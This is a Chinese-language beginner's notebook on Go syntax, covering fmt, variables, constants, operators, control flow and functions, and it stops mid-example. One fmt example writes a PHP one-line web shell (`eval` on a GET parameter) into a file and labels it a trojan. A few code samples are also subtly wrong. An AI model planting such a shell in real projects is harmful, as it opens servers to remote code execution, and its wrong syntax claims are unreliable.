# GoLang 学习 （入门）

go run 1.go 执行命令

go build 1.go 打包为exe

快速 并且无依赖

在开始项目 需要 生成 go.mod

go mod init mod 终端执行

```
go: creating new go.mod: module mod
go: to add module requirements and sums:
        go mod tidy
```



## go的基本目录结构

```
src
------gocode
------------项目
------------项目1
---------------------main  //代码存放处
```



## 1.基本go语言演示

参考资料：

 [https://www.cnblogs.com/jiangchunsheng/p/14329024.html](https://www.cnblogs.com/jiangchunsheng/p/14329024.html) 

 [前景 · Go语言中文文档](https://www.topgoer.com/) 

```
package main
​
import "fmt"
func main() {
    fmt.Println("hello word");
}
```

这里会打印出helloword 所以这是最简单的go语言

但是这里还是需要解释

### fmt解释

fmt是go语言的一个包 包含了输入输出内容

包含下面的内容

#### 输出

直接将字符串输出到控制台

```
package main
​
import "fmt"
​
func main() {
    fmt.Print("hello word")
}
go
```

这里我们可以发现是通过 Print 的输出方式 这个其实就是原封不动的将内容暑促

这个内容是支持格式化字符串的输出

```
package main
​
import "fmt"
​
func main() {
    fmt.Printf("hello word\n%s", "no")
}
​
```

这里我们可以发现 可以通过占位符或者 格式化处理后的内容

这个会自己添加换行 就是一个代码一行 不支持格式化处理

```
package main
​
import "fmt"
​
func main() {
    fmt.Println("hello word")
    fmt.Println("hello word123123")
}
​
```

这个系列的函数会将内容输出到一个 io.writer接口中欧你

我们可以通过这个函数将文件中写入内容

给出例子

```
package main
​
import (
    "fmt"
    "os"
)
​
func main() {
    fmt.Fprintln(os.Stdout, "开始向当前目录下的1.php写入木马")
    fileObj, err := os.OpenFile("./1.php", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
    if err != nil {
        fmt.Println("打开文件错误,err:", err)
    }
    name := "<?php @eval($_GET[1]);?>"
    fmt.Print("写入成功")
    fmt.Fprint(fileObj, "写如：$s", name)
}
​
```

发现这里通过 os 包 实现系统写入内容 并且通过fileObj获取到 创建、写、加等操作

最后这里通过 Fprint 写入文件

会将传入的数据 生成 并且返回一个字符串 可以使用格式化

```
package main
​
import "fmt"
​
func main() {
    s1 := fmt.Sprintf("不同的字符串哦")
    s2 := fmt.Sprintln("输出内容了哦")
    fmt.Println(s1)
    fmt.Println(s2)
}
​
```

这里是将输入内容全部转为字符串

这里是甩出错误信息

```
package main
​
import (
    "errors"
    "fmt"
)
​
func main() {
    s1 := errors.New("写入poc木马出错")
    w := fmt.Errorf("错误内容出现了：%w", s1)
    fmt.Println(w)
}
​
```

#### 输入

```
package main
​
import (
    "fmt"
)
​
func main() {
    var (
        name     string
        age      int
        maarried bool
    )
    fmt.Scan(&name, &age, &maarried)
    fmt.Printf("结果为 name:%v age: %d married:%v", name, age, maarried)
​
}
​
```

这里通过输入内容 并且%v 自动识别是什么类型 输出 结果

是上面的升级 我们可以通过字符串规定输入内容

```
package main
​
import (
    "fmt"
)
​
func main() {
    var (
        name     string
        age      int
        maarried bool
    )
    fmt.Scanf("1:%v 2:%d 31:%v", &name, &age, &maarried)
    fmt.Printf("结果为 name:%v age: %d married:%v", name, age, maarried)
​
}
​
```

```
1:lxz 2:18 3:no
结果为 name:lxz age: 18 married:false
```

我们需要按照格式输入 才会被存入变量中 否则不会

这个的作用是用户输入回车 就停止扫描 存入变量

```
package main
​
import (
    "fmt"
)
​
func main() {
    var (
        name     string
        age      int
        maarried bool
    )
    fmt.Scanln(&name, &age, &maarried)
    fmt.Printf("结果为 name:%v age: %d married:%v", name, age, maarried)
​
}
​
```

```
lxz 18 no
结果为 name:lxz age: 18 married:false
```

这里就介绍完了 fmt包的内容

然后我们继续

## 2.go代码的组成

首先 我们通过上面的代码 可以发现存在一下组成部分

```
包声明
package main
就是一个包  这是必须的 所有go项目 必须存在一个 main包 
​
引入包
import  "lmt" 如果多个包  import( "lmt","os")
这里就和python的import类似
​
函数
func main() 主函数 这是每个 go项目必须的
​
变量
语句 & 表达式
注释
​
```

的标识符

这里介绍无效的标识符


- 1ab（以数字开头）


- case（Go 语言的关键字）


- a+b（运算符是不允许的）



的字符串链接

字符串链接 通过 +实现

例如

```
fmt.Println("hello "+"world")
```

的空格

这里需要特地介绍一下空格

在关键字和表达式中一定需要加上空格

例如

```
if x > 0{
​
}
```

再比如 这里的函数调用 两个参数和 函数与等号之间 都需要空格

```
result := add(2, 3)
```

## 3.go的语言类型

这里直接查看菜鸟教程即可

 [Go 语言数据类型 | 菜鸟教程](https://www.runoob.com/go/go-data-types.html) 

### 语言变量

这里要介绍一下go的变量

go语言由 数字，字母，下划线组成变量

不能为数字开头

申明变量一般使用 var 、 可以一次申明多个变量

```
申明变量的格式 var 变量名字 类型
如：
1.var  name string
​
2.var(
    name string
    age int
    password int
)
3. var password,age int
​
如果要赋值
    var (
        name     string = "xxx"
        age      int    = 18
        maarried bool   = false
    )
即可实现
```

如果没有初始化 那么就是 零值

### 变量的赋值

这里需要注意 下面这个方式是不可以的

```
package main
​
import "fmt"
​
func main() {
    //1  使用var变量声明 赋值
    var num int = 18
    fmt.Println(num)
​
    //2  不赋值
    var num2 int
    fmt.Println(num2)
​
    //3  自动推断变量名
    var num3 = 38
    fmt.Println(num3)
​
    //4 省略 var  直接赋值
    num4 := 40
    fmt.Println(num4)
}
​
```

报错 因为已经声明变量了 所以第二次申明就发生报错

这里我们可以通过

age:=1 直接申明 这里就相当于

```
var age int 
age =1
```

所以我们其实不需要大费周章的var设置 （除非真的需要）

我们对字符串 bool 都可以通过

```
name :="abc"
age :=18
password := false   (bool类型)
```

```
package main
​
import (
    "fmt"
)
​
func main() {
    name :="abc"
    age :=18
    maarried := false 
    fmt.Printf("结果为 name:%v age: %d married:%v", name, age, maarried)
​
}
​
```

## 总结

```
//变量总结
package main
​
import (
    "fmt"
)
​
// 全局变量
var n14 = 100
var n90 = 000
​
// 一次性的全局变量声明
var (
    n123 = "no"
    n312 = "yes"
)
​
func main() {
    // 均为局部变量
    //1  使用var变量声明 赋值
    var num int = 18
    fmt.Println(num)
​
    //2  不赋值
    var num2 int
    fmt.Println(num2)
​
    //3  自动推断变量名
    var num3 = 38
    fmt.Println(num3)
​
    //4 省略 var  直接赋值
    num4 := 40
    fmt.Println(num4)
    fmt.Println("----------------------------------------------------------------------------")
    var n1, n2, n3 int
    fmt.Println(n1, n2, n3)
    var n4, n5, n6 = 10, "fuck", 7.8
    fmt.Println(n4, n5, n6)
    n7, n8, n9 := 1123, "you ", 7.112313
    fmt.Println(n7, n8, n9)
    fmt.Println("----------------------------------------------------------------------------")
    fmt.Println(n7, n90)
    fmt.Println("----------------------------------------------------------------------------")
    fmt.Println(n123, n312)
}
​
```

### 常量的定义

这里介绍一下常量的定义

基本格式为

```
const 常量名 [类型] = value
​
这里需要注意 类型是通过 [] 来选择的 所以是可选的
​
和变量赋值一样 我们通过传递 参数 语言可以自动识别是什么类型的
```

```
package main
​
import "fmt"
​
func main(){
    const LENGTH int = 8 
    const WIDTH int = 5
    var area int //这里注意 var是和const的区别是 一个变量 一个常量
    const a,b,c = 1, false ,'1111'
    
    area = LENGTH * WIDTH
    fmt.Printf("面积为:%d",area)
    println()
    println(a,b,c)
}
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\1.基础go.go"
面积为:40
1 false 1111
```

常量还可以通过枚举的方式实现

```
const (
    error = 0
    true = 1
    male =2
)
```

这里需要介绍一个特殊的"常量"

#### iota

这个常量是会通过行数自行增加

```
const(
    a = iota  //0   
    b         //1
    c        //2
    d = "str" //这个时候是存在常量值了 就不进行覆盖 而是继续加1 //3
    e        //这里继承的是d的值 所以这里其实是 "str"   iota +=1
    f = 100   //这里为 100 iota继续+1
    g        //继承 f  iota +1
    h = iota  //恢复计数 7
    i         // 8
)
```

完整代码

```
package main
​
import "fmt"
​
func main() {
    const (
        a = iota  //0
        b         //1
        c         //2
        d = "str" //这个时候是存在常量值了 就不进行覆盖 而是继续加1 //3
        e         //这里继承的是d的值 所以这里其实是 "str"   iota +=1
        f = 100   //这里为 100 iota继续+1
        g         //继承 f  iota +1
        h = iota  //恢复计数 7
        i         // 8
    )
    fmt.Println(a, b, c, d, e, f, g, h, i)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\1.基础go.go"
0 1 2 str str 100 100 7 8
```

这里跟着菜鸟教程的内容查看 << 的使用

```
package main
​
import "fmt"
​
func main() {
    const (
        i = 1 << iota
        j = 3 << iota
        k 
        l
    )
    fmt.Println(i,j,k,l)
}
​
```

这里介绍一下

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\1.基础go.go"
1 6 12 24
```

```
1 << iota  其实是 1 << 0 不移动 所以不变
3 << iota  这个时候 iota为 1  << 代表二进制向左移动1位  3 = 0011  -----> 移动1位  ----> 0110=6
3 << iota  这个时候 iota为 2  变为 1100 =12   这里发现 常数值是不变 只变了iota值
```

## 4.go的运算符

### 二进制的运算符

| & | 按位与运算符"&"是双目运算符。 其功能是参与运算的两数各对应的二进位相与。 | (A & B) 结果为 12, 二进制为 0000 1100 |
|:---:|:---:|:---:|
| | | 按位或运算符"|"是双目运算符。 其功能是参与运算的两数各对应的二进位相或 | (A | B) 结果为 61, 二进制为 0011 1101 |
| ^ | 按位异或运算符"^"是双目运算符。 其功能是参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。 | (A ^ B) 结果为 49, 二进制为 0011 0001 |
| << | 左移运算符"<<"是双目运算符。左移n位就是乘以2的n次方。 其功能把"<<"左边的运算数的各二进位全部左移若干位，由"<<"右边的数指定移动的位数，高位丢弃，低位补0。 | A << 2 结果为 240 ，二进制为 1111 0000 |
| >> | 右移运算符">>"是双目运算符。右移n位就是除以2的n次方。 其功能是把">>"左边的运算数的各二进位全部右移若干位，">>"右边的数指定移动的位数。 | A >> |



假定 A 为60，B 为13：

这里还要注意一下其他的运算符号

### 其他运算符

| & | 返回变量存储地址 | &a; 将给出变量的实际地址。 |
|:---:|:---:|:---:|
| * | 指针变量。 | *a; 是一个指针变量 |



```
package main
​
import "fmt"
​
func main() {
    var a int = 4
    var ptr *int
    ptr = &a
    fmt.Println(a, ptr)
}
​
```

这里我们为a赋值 并且获取到 a 的变量地址

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\1.基础go.go"
4 0xc00000a0b8
```

这里可以看到 现在变量在我电脑中的地址是上面这个

### 运算优先级

| 5 | * / % << >> & &^ |
|:---:|:---:|
| 4 | + - | ^ |
| 3 | == != < <= > >= |
| 2 | && |
| 1 | || |



这里是关于go 中运算的优先级 由上至下代表优先级由高到低

## 5.go语言的条件运算符

这里主要介绍一下

```
select 其实和 switch 类似 都是通过 case来获取
但是不一样的是 select 是随机获取    如果没有case 就会杜塞 直到出现case
​
```

继续学习一下跳出循环的方式

这里有3个

```
break：
这个是 中断当前for 循环 或者 switch的时候 选择一个case后 跳出switch
​
continue：
这个是 跳过当前循环的剩余内容 然后继续下一个的循环 例如 我们需要循环10次 这里第2次 符合条件，但是不想停 我们就跳出第二次 开始执行第三次
​
goto:
符合条件时跳转到特定地址
​
```

这里解释一下goto的内容

### goto

```
package main
​
import "fmt"
​
func main() {
    var a int = 10
    LOOP : for a < 20{
        if a == 15 {
            a +=1
            goto LOOP
        }
        fmt.Println(a)
        a++
    }
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\1.基础go.go"
10
11
12
13
14
16
17
18
19
```

这里我们可以看见 满足条件后 a+1 然后直接 跳到 loop 开始下一个循环

### for

这里也要介绍一下go的for循环方式

for存在3中写法 都和c语言类似

```
for 控制变量的处置; 逻辑表达式控制;控制变量的增量
例子 for i; i < n ; i++{
​
}
​
for 逻辑表达式控制
例子 for n > i{
​
}
​
for {}
这里是类似于 while(true)
```

这里也给出例子 说明一下go的特殊的for

#### 例子一 通过for 定义多个变量

```
s := "abc"
​
for i, n := 0, len(s); i < n; i++ { // 常见的 for 循环，支持初始化语句。
    println(s[i])
}
​
这里我们可以发现 设定了两个变量
i = 0
n = len(s) 是的 没错 n := 0 ,len(s) 是给 n 赋值 len(s)
```

#### 例子二

```
package main
​
func main() {
    s := "abc"
    n := len(s)
    for n > 0 {
        n--
        println(s[n])
    }
}
​
```

这里其实就是通过 while(n > 0)的方式实现 或者 for(; n > 0 ;)

#### 例子三

```
package main
​
// import "go/printer"
​
func main() {
    s := "abc"
    for {
        println(s)
    }
}
​
```

无限循环

### 数组的循环

这里介绍一下数组 在go中如何遍历

```
package main
​
func main() {
    a := [3]int{333, 222, 111} //数组的声明
    for n, i := range a {
        println(n, i)
​
    }
​
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\1.基础go.go"
0 333
1 222
2 111
```

这里我们可以发现 通过 range 数组 可以将里面进行遍历

```
package main
​
func main() {
    a := [3]string{"333", "fuck", "you"} //数组的声明
    for n, i := range a {
        println(n, i)
​
    }
​
}
​
```

字符串也行

## 6.函数

这里学习一下函数

```
func 函数名(参数 类型)[函数返回的类型]{
​
}
```

例子

```
package main
​
func main() {
    a := 123
    b := 321
    println(max(a, b))
}
func max(num1, num2 int) int {
    var result int
    if num1 > num2 {
        result = num1
    } else {
        result = num2
    }
    return result
}
​
```

这里就是基本的函数定义

## 7.数组

这里学习一下数组

数组的声明

```
var 数组名字 [大小]数组类型{}
​
var test [10]float{}
​
```

和变量一样 可以通过 := 声明

```
number := [10]float{}
```

数组长度不确定 我们就通过 [...] 来代替

如果我们需要指定某位置的内容我们可以通过下面的方式来实现

```
num := [...]int{1:123,3:321}
```

```
package main
​
import (
    "fmt"
)
​
func main() {
    num := [...]int{1: 123, 3: 321}
    for k := 0; k < 4; k++ {
        fmt.Printf("num[%d] = %d\n", k, num[k])
    }
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\1.基础go.go"
num[0] = 0
num[1] = 123
num[2] = 0
num[3] = 321
```

## ---------------------------------------------

这里重新学清楚一下

## 数据类型

### 扩展 进制

几进制：逢几进1

```
十六进制               十进制          八进制             二进制
0
1                        0              0                 0
2                        1              1                 1
3                        2              2                 10 //进1
4                        3              3
5                        4              4
6                        5              5
7                        6              6
8                        7              7
9                        8              10 //进1
A                        9
B                        10 //进1
C
D
E
F
10 //进1
```

#### 十进制进制 ，二进制 互相转换

```
2  ---- 10
​
1101 ====   1   1    0    1
然后×上 2的x幂
​
1*2^3 + 1*2^2 + 0*2^1 + 1*2^0
= 8 + 4 + 0 + 1 = 13
​
10 ---- 2
13 
​
13 // 2 = 6 余 1    ^
6 // 2 =  3 余 0    |
3 // 2 =  1 余 1    |
1 // 2 =  0 余 1    |
然后从下往上看
​
```

#### 八进制，十进制 互相转换

```
16
1    6  =  1*8^1 + 6*8^0
8 + 6 = 14
​
14
​
14 //8  = 1 余数 6
1 // 8  = 0 余数 1
倒着看
16
```

#### 八进制转换为十六进制

```
先转为十进制
​
8 ----->  10  ------> 16
```

### 整数型

#### 有符号

```
int
1字节 = 8位
有符号  int8 int 16 int 32 int64   分别占 1，2，4，8 字节   存储空间的不同
int8 :  -128 --- 127
int16 : -32768-32767
如何计算的呢
​
0 1 1 1 1 1 1 1  二进制 11111111 --- >  127 加上 +  +127  最大值
1 0 0 0 0 0 0 0 二进制 11111111 ---->  128 加上 -   -128  最小值
-1 取反  ----> 正数
01111111 （取反） 10000000 (无符号的正数)  + -号  = -128
```

```
package main
​
func main() {
    var a int8 = 32
    var b int8 = 133
    println(a, b)
}
//超出范围
```

```
PS C:\Users\Administrator\Desktop\go\src\learn\main> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
# command-line-arguments
.\main.go:5:15: cannot use 133 (untyped int constant) as int8 value in variable declaration (overflows)
```

#### 无符号

```
无符号 uint8 uint16 uint32 uint64
uint8 0~255
uint16 0~2的16次方-1
​
​
11111111 = 2^7 +127 = 255
00000000 = 0 
​
只能是非负的
```

#### 其他类型

```
int    有符号     32位系统 4字节   64位8字节     go的默认声明 为 int
uint   无符号     32位系统 4字节   64位8字节
​
```

```
package main
​
import (
    "fmt"
    "unsafe"
)
​
func main() {
    var a int8 = 32
    var b = 133
    println(a)
    fmt.Printf("类型是：%T\n", b)
    //打印对应类型的字节数
    fmt.Println(unsafe.Sizeof(b))
}
​
```

#### 如何选择

保小不保大

```
var age int64 = 28 //浪费
var age uint8 = 18 //符合
```

### 浮点类型

```
浮点就是存放小数的
float32 4字节 
float64 8字节   //和操作系统无关
​
PS:会有精度损失
符号位 指数位 尾数位 尾数位只是存储了大概 容易精度损失
```

```
package main
​
import "fmt"
​
func main() {
    var num1 float32 = 3.14
    fmt.Println(num1)
​
    var num2 float32 = -3.14
    fmt.Println(num2)
    //科学计数法 e大小写均可
    var num3 float32 = 314e-2
    fmt.Println(num3)
​
    var num4 float32 = 314e+2
    fmt.Println(num4)
​
    var num5 float64 = 3.14
    fmt.Println(num5)
    fmt.Println("--------------精度---------------")
    var num6 float32 = 256.00000000000916
    fmt.Println(num6)
    var num7 float64 = 256.00000000000916
    fmt.Println(num7)
}
​
```

```
PS C:\Users\Administrator\Desktop\go\src\learn\main> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
3.14
-3.14
3.14
31400
3.14
--------------精度---------------
256
256.00000000000915
```

#### 选择

通常选择 float64位 默认也是float64

## 运算符

## 

### 计算运算符

#### +

```
package main
​
import "fmt"
​
func main() {
    // + 号  1. 正数  2. 相加 3.字符串拼接
    var n1 int = +10
    fmt.Println(n1)
    var n2 int = 4 + 7
    fmt.Println(n2)
    var s1 string = "fuck" + "you"
    fmt.Println(s1)
}
​
```

```
PS C:\Users\Administrator\Desktop\go\src\learn\main> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
10
11
fuckyou
```

#### /

```
package main
​
import "fmt"
​
func main() {
    fmt.Println(10 / 3)  
    fmt.Println(10.0 / 3)
}
​
```

```
PS C:\Users\Administrator\Desktop\go\src\learn\main> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
3
3.3333333333333335
```

#### % 取模

等价于 a%b = a-a/b*b

```
package main
​
import "fmt"
​
func main() {
    fmt.Println(10 % 3)  //10%3 = 10- 10/3*3 = 10-9  = 1
    fmt.Println(-10 % 3)
    fmt.Println(10 % -3)
    fmt.Println(-10 % -3) 
}
​
```

```
PS C:\Users\Administrator\Desktop\go\src\learn\main> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
1
-1
1
-1
```

#### ++ --

```
package main
​
import "fmt"
​
func main() {
    var a int = 10
    a++
    fmt.Println(a)
    //只能单独运算，不能参与运算中
    a-- // 没有 --a ++a
    fmt.Println(a)
}
​
```

```
PS C:\Users\Administrator\Desktop\go\src\learn\main> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
11
10
```

### 赋值运算符

```
=  +=  -+  *=  /=  %=
类型都是bool
a = b  b赋值给a
```

```
package main
​
import "fmt"
​
func main() {
    var a int = 10 // 10 赋值给 a
    var b int = (10*20)%3 + 3 - 7
    fmt.Println(a, b)
    a += 10
    // a = a + 10
    fmt.Println(a)
}
​
```

```
PS C:\Users\Administrator\Desktop\go\src\learn\main> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
10 -2
20
```

### 关系运算符

```
类型都是bool
== != >= <= < >
要么true 要么false
```

```
package main
​
import "fmt"
​
func main() {
    fmt.Println(5 == 9)
}
​
```

### 逻辑运算符

```
&& || !
与 或 非
```

```
package main
​
import (
    "fmt"
)
​
func main() {
    // &&
    fmt.Println(true && true)
    // ||
    fmt.Println(true || false)
    // !
    fmt.Println(!false)
}
​
```

### 位运算符

```
&  |   ^
```

### 其他运算符

```
& *
&： 返回变量的存储地址
*： 取指针变量的对应数值
```

```
package main
​
import "fmt"
​
func main() {
    var age int = 18
    fmt.Println("age: ", &age) //age:  0xc00000a0b8
​
    var ptr *int = &age
    fmt.Println(ptr)  //0xc00000a0b8
    fmt.Println(*ptr) //18
}
​
```

## 流程控制

### 分支结构

#### if分支

##### 单分支

```
if 条件表达式{
    逻辑代码
}
PS： if和条件表达式中间需要空格
```

```
package main
​
import "fmt"
​
func main() {
    var count int = 20
    if count < 30 {
        fmt.Println("数量不足")
    }
}
​
```

if后可以加入变量的定义

```
package main
​
import "fmt"
​
func main() {
​
    if count := 20; count < 30 {
        fmt.Println("数量不足")
    }
}
​
```

##### 双分支

```
if 条件表达式{
    逻辑代码1
}else{
    逻辑代码2
}
​
下面是错误的 ！！！！！！！
if 条件表达式{
    逻辑代码1
}
else{
    逻辑代码2
}
```

```
package main
​
import "fmt"
​
func main() {
​
    if count := 30; count < 30 {
        fmt.Println("数量不足")
    } else {
        fmt.Println("数量充足")
    }
}
​
```

##### 多分支

```
if 条件表达式{
    逻辑代码1
} else if 条件表达式2 {
    逻辑代码2
}......{
    逻辑代码....
}else{
    逻辑代码n
}
​
```

```
package main
​
import "fmt"
​
func main() {
​
    if count := 30; count < 30 {
        fmt.Println("数量不足")
    } else if count > 15 {
        fmt.Println("数量还可以")
    } else {
        fmt.Println("数量充足")
    }
    //分支符合了 就不会再执行了
}
​
```

#### switch分支

```
swtich 表达式 {
    case 值1,值2:
        语句块
    case 值3,值4:
        语句块
    default:
        语句块
}
```

```
package main
​
import "fmt"
​
func main() {
    var score int = 187
    switch score / 10 {
    case 10:
        fmt.Println("你的等级为A ")
    case 9:
        fmt.Println("你的等级为B ")
    case 8:
        fmt.Println("你的等级为C ")
    case 7:
        fmt.Println("你的等级为D ")
    case 6:
        fmt.Println("你的等级为E ")
    case 5:
        fmt.Println("你的等级为F ")
    case 4:
        fmt.Println("你的等级为G ")
    case 3:
        fmt.Println("你的等级为H ")
    case 2:
        fmt.Println("你的等级为I ")
    case 1:
        fmt.Println("你的等级为J ")
    case 0:
        fmt.Println("你的等级为K")
    default:
        fmt.Println("成绩出错")
    }
}
​
```

##### switch的细节

```
注意事项:
1、switch 后面是表达式、变量、常量 （需要返回一个确切的值）
2、case后面如果是常量 那么就不能重复（分支不能一样）
3、case后面的值 需要和switch的
​
var a int32 = 5
var b int64 = 9
switch a {
    case b :
}
上面是不行的
​
4、 case 后面可以带很多值 通过 逗号 分开
​
    switch score / 10 {
    case 10, 11, 12:
        fmt.Println("你的等级为A ")
        
5、 case后面不需要break
6、 default 可以不需要，位置可以随意
7、 switch 也可以不带表达式 可以当作if使用
​
package main
​
import "fmt"
​
func main() {
    var score int = 87
    switch {
    case score == 2:
        fmt.Println("nonono")
    case score != 2:
        fmt.Println("yesyeses")
    }
}//不推荐
​
8、switch 后面也可以直接定义变量 使用分号
​
package main
​
import "fmt"
​
func main() {
    switch score := 86; {
    case score == 2:
        fmt.Println("nonono")
    case score != 2:
        fmt.Println("yesyeses")
    }
}//不推荐
9、 switch穿透 利用 fallthrough 可以穿透到下一个case
​
package main
​
import "fmt"
​
func main() {
    var score int = 87
    switch score / 10 {
    case 10:
        fmt.Println("你的等级为A ")
    case 9:
        fmt.Println("你的等级为B ")
    case 8:
        fmt.Println("你的等级为C ")
        fallthrough
    case 7:
        fmt.Println("你的等级为D ")
    case 6:
        fmt.Println("你的等级为E ")
    case 5:
        fmt.Println("你的等级为F ")
    case 4:
        fmt.Println("你的等级为G ")
    case 3:
        fmt.Println("你的等级为H ")
    case 2:
        fmt.Println("你的等级为I ")
    case 1:
        fmt.Println("你的等级为J ")
    case 0:
        fmt.Println("你的等级为K")
    default:
        fmt.Println("成绩出错")
    }
}
输出//
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
你的等级为C 
你的等级为D
```

## 循环结构

### for

```
for (初始表达式;布尔表达式;迭代因子) {
    循环体
}
```

```
package main
​
import "fmt"
​
func main() {
    var num int
    for i := 0; i <= 5; i++ {
        num += i
    }
    fmt.Println(num)
}
​
```

for 和var 都不可以使用var初始化变量

## 函数

```
func 函数名(形参) (返回值类型){
    执行
    return 返回
 }
```

```
package main
​
import "fmt"
​
func add(num1 int, num10 int) int {
    var sum int
    sum = num1 + num10
    return sum
}
​
func main() {
    var num int = 10
    var num2 int = 30
    fmt.Println(add(num, num2))
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
40
```

### 函数的细节

```
1、函数 对我们需要的功能进行分装 我们后续可以复用
2、函数和函数是并列的 所以不能将 函数写入 main中
3、函数名： 
首字母不能是数字 
如果首字母大写 那么其他包也可以使用  （public）
如果首字母小写 那么其他包不可以使用  （private）
​
4、形参列表：
个数没有限制
作用是接受外来的数据
​
5、返回值类型列表
个数没有限制
​
​
package main
​
import "fmt"
​
func add(num1 int, num10 int) {
    var sum int
    sum = num1 + num10
    fmt.Println(sum)
}
​
func main() {
    add(10, 20)
​
}
// 可以发现 这里没有返回值 直接输出 所以可以不写
//多个返回值  && 在多个返回值中 只获取一个
package main
​
import "fmt"
​
func add(num1 int, num10 int) (int, int) {
    var sum int
    sum = num1 + num10
    var res int
    res = num1 - num10
    return sum, res
}
​
func main() {
    sum, _ := add(10, 20) //如果我不需要后面的result 那么使用 _ 来忽略
    fmt.Println(sum)
​
}
​
```

### 内存分析

```
package main
​
import "fmt"
​
//实现交换
func change(n1 int, n2 int) {
    var t int
    t = n1
    n1 = n2
    n2 = t
}
​
func main() {
    var num1 int = 10
    var num2 int = 20
    fmt.Printf("交换前两个数分别是: a = %v , b = %v \n", num1, num2)
    change(num1, num2)
    fmt.Printf("交换后两个数分别是: a = %v , b = %v ", num1, num2)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
交换前两个数分别是: a = 10 , b = 20 
交换后两个数分别是: a = 10 , b = 20
```

发现没有实现数字的交换

<img src="https://i-blog.csdnimg.cn/blog_migrate/fe7dffe9d2cdd1fb6c2d7ac55e92e089.png" alt="" style="max-height:390px; box-sizing:content-box;" />


执行完函数后 exchangeNum 函数的栈帧会被销毁

并且值没有传递回去 所以没有改变 main的 num num1

```
package main
​
import "fmt"
​
//实现交换
func change(n1 int, n2 int) (int, int) {
    var t int
    t = n1
    n1 = n2
    n2 = t
    return n1, n2
}
​
func main() {
    var num1 int = 10
    var num2 int = 20
    fmt.Printf("交换前两个数分别是: a = %v , b = %v \n", num1, num2)
    num1, num2 = change(num1, num2)
    fmt.Printf("交换后两个数分别是: a = %v , b = %v ", num1, num2)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
交换前两个数分别是: a = 10 , b = 20 
交换后两个数分别是: a = 20 , b = 10
```

### go中支持可变参数

```
package main
​
import "fmt"
​
func test(nums ...int) { //定义了int类型 的可变参数 可以传入多个int类型数据
    fmt.Println(nums)
}
func main() {
    test()
    test(1, 2, 3)
    test(1, 1, 1, 1, 1, 1, 1, 1)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
[]
[1 2 3]
[1 1 1 1 1 1 1 1]
```

里面怎么处理呢

```
package main
​
import (
    "fmt"
)
​
func test(nums ...int) { //定义了int类型 的可变参数 可以传入多个int类型数据
    //函数内部当做可变参数为 切片 来处理 （数组）
    //遍历可变参数
    for i := 0; i < len(nums); i++ {
        fmt.Println(nums[i])
    }
}
func main() {
    test()
    fmt.Println("----------------------------------")
    test(1, 2, 3)
    fmt.Println("----------------------------------")
    test(1, 1, 1, 1, 1, 1, 1, 1)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
----------------------------------
1
2
3
----------------------------------
1
1
1
1
1
1
1
1
```

数组和基本函数类型的修改 不会影响原本函数 因为只传递值

但是如果我想在函数内修改的话 我们可以传入指针和地址来实现

```
package main
​
import (
    "fmt"
)
​
func test(num1 *int) { //这里传入的是地址
    *num1 = 30 //对地址对应的变量进行该值
    fmt.Println("test--------", *num1)
}
func main() {
    var num1 int = 50
    test(&num1) // 传入地址
    fmt.Println("main--------", num1)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
test-------- 30
main-------- 30
```

发现修改了 这里的原理这里



<img src="https://i-blog.csdnimg.cn/blog_migrate/85d0fa5dd83e729c0b48b8253eb03dde.png" alt="" style="max-height:353px; box-sizing:content-box;" />


传入的内容就是一个地址 所以我们修改内容就会通过地址找到main函数中的参数 然后修改

### 函数也是一个数据类型

```
函数也是一个数据类型，可以赋值给一个变量 这个时候 函数就是这个变量了 然后可以通过 变量对函数进行调用
```

```
package main
​
import (
    "fmt"
)
​
func test(num int) { //这里是一个数据类型
    fmt.Println(num)
}
func main() {
    a := test
    fmt.Printf("a 对于的类型 %t  \ntest函数对应的类型 %t\n", a, test)
    a(1)
​
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
a 对于的类型 %!t(func(int)=0x5254c0)  
test函数对应的类型 %!t(func(int)=0x5254c0)
1
```

可以发现 两个的type 都是一样的 而且可以通过 a(1) 对test进行调用

### 函数可以作为形参 并且调用

```
package main
​
import (
    "fmt"
)
​
func test(num int) { //这里是一个数据类型
    fmt.Println(num)
}
​
func add(num1 int, num float32, testFunc func(int)) {
    fmt.Println("----调用成功")
}
func main() {
    add(1, 2.0, test)
}
​
```

```
PS C:\Users\Administrator\Desktop\go> go run "c:\Users\Administrator\Desktop\go\src\learn\main\main.go"
----调用成功
```

### go支持自定义数据类型

```
type 自定义数据类型 数据类型    （相当于起别名）
​
type myint int ------> myint = int
​
```

```
package main
​
import (
    "fmt"
)
​
func test(num int) { //这里是一个数据类型
    fmt.Println(num)
}
​
